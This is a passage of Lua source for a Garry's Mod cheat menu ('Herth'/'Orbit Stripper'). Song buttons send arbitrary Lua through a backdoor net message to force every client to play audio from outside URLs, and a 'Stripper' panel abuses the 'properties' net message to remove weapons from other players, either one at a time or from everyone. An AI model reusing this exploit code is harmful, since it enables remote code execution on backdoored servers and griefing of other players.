        end
        drose.DoClick = function()
        net.Start(netKey)   
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://nebulanetworks.x10host.com/home/songs/drose.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer()
        end
    local drose = DScrollPanel:Add( "DButton", Song )
        drose:SetSize(225,25)
        drose:SetTextColor(Color(255,255,255))
        drose:SetPos(5,113)
        drose:SetText("YMCA")
        drose.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,drose:GetWide(),drose:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,drose:GetWide()-4,drose:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,drose:GetWide()-8,drose:GetTall()-8)
        end
        drose.DoClick = function()
        net.Start(netKey)   
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://nebulanetworks.x10host.com/home/songs/ymca.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer()
        end
    local drose = DScrollPanel:Add( "DButton", Song )
        drose:SetSize(225,25)
        drose:SetTextColor(Color(255,255,255))
        drose:SetPos(5,140)
        drose:SetText("Can't Be Friends")
        drose.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,drose:GetWide(),drose:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,drose:GetWide()-4,drose:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,drose:GetWide()-8,drose:GetTall()-8)
        end
        drose.DoClick = function()
        net.Start(netKey)   
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://nebulanetworks.x10host.com/home/songs/whycant.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer()
        end
    local Blue = DScrollPanel:Add( "DButton", Song )
        Blue:SetSize(225,25)
        Blue:SetTextColor(Color(255,255,255))
        Blue:SetPos(5,167)
        Blue:SetText("Blue Song(Odium)")
        Blue.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,drose:GetWide(),drose:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,drose:GetWide()-4,drose:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,drose:GetWide()-8,drose:GetTall()-8)
        end
        Blue.DoClick = function()
        LocalPlayer():EmitSound("http://zeitarp.site.nfoservers.com/jobvote/votesound.mp3", 100, 100)
        end
    local boss = DScrollPanel:Add( "DButton", Song )
        boss:SetSize(225,25)
        boss:SetTextColor(Color(255,255,255))
        boss:SetPos(5,194)
        boss:SetText("Boss Lil Pump")
        boss.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,drose:GetWide(),drose:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,drose:GetWide()-4,drose:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,drose:GetWide()-8,drose:GetTall()-8)
        end
        boss.DoClick = function()
        net.Start(netKey)   
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://nebulanetworks.x10host.com/home/songs/boss.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer() 
        end









--[[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Hacks
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]]
    local DScrollPanel = vgui.Create( "DScrollPanel", hacks )
    DScrollPanel:Dock( FILL )























--[[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Stripper
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]]
time = 1
function Ply(name) -- finds player name
        name = string.lower(name);
        for _,v in ipairs(player.GetHumans()) do
            if(string.find(string.lower(v:Name()),name,1,true) != nil) then
                return v;
            end
        end
    end
 
    function stripPlayer(ply) -- Strip player function
        if ply:IsPlayer() then
 
            for k,v in pairs(ply:GetWeapons()) do

                net.Start("properties")
                net.WriteString( "remove" , 32 )
                net.WriteEntity( v )
                net.SendToServer()
            end
        end

    end
    concommand.Add("removewep_crosshair", function()
    local xhair = LocalPlayer():GetEyeTrace().Entity
    stripPlayer(xhair)
    end)

    function removeAll() -- Strips all Players
        for k,v in pairs(player.GetAll()) do
            stripPlayer(v)
        end
    end

    local button = vgui.Create("DButton", strip)
    button:SetText("Strip Everyone")
    button:SetPos(250/2-60,7)
    button:SetSize(210/2, 25)
    button:SetTextColor(Color(255, 255, 255))
    button.DoClick = function ()
        removeAll()
        chat.AddText(Color(0,128,255), "[Orbit Stripper] ", Color(128,128,128), "Everyone Got Stripped.")
    end
    button.Paint = function( self, w, h )
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,button:GetWide(),button:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,button:GetWide()-4,button:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,button:GetWide()-8,button:GetTall()-8)
    end
    
    local AppList = vgui.Create( "DListView", strip)
    AppList:SetSize(210,370)
    AppList:SetPos(12, 35)
    AppList:SetMultiSelect( false )
    AppList:AddColumn( "Click Name To Strip" )
    for k, v in pairs(player.GetAll()) do
        AppList:AddLine(v:Name())
    end
    AppList.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,AppList:GetWide(),AppList:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,AppList:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,AppList:GetWide()-8,AppList:GetTall()-8)
    end
 
    AppList.DoDoubleClick = function( lst, index, pnl )
        --print( "Selected " .. pnl:GetColumnText( 1 ) .. " at index " .. index )
        ply = Ply(pnl:GetColumnText( 1 ))
        chat.AddText(Color(0,128,255), "[Orbit Stripper] ", Color(128,128,128), pnl:GetColumnText( 1 ).." Got Stripped.")
        stripPlayer(ply) 
    end
    
 
    concommand.Add("menu",menu)
    concommand.Add("strip",stripPlayer)
function removeWeapons()
    local Target = LocalPlayer():GetEyeTrace().Entity
    if  Target:IsPlayer() then
        for x,y in pairs(Target:GetWeapons()) do
            net.Start("properties")
            net.WriteString( "remove" , 32 )
            net.WriteEntity( y )
            net.SendToServer()
        end
    end
end















--[[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    End Stuff like Close button ect
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]]






--[[---------------------------------------------------------
    Herth Con-Command End
-----------------------------------------------------------]]
end)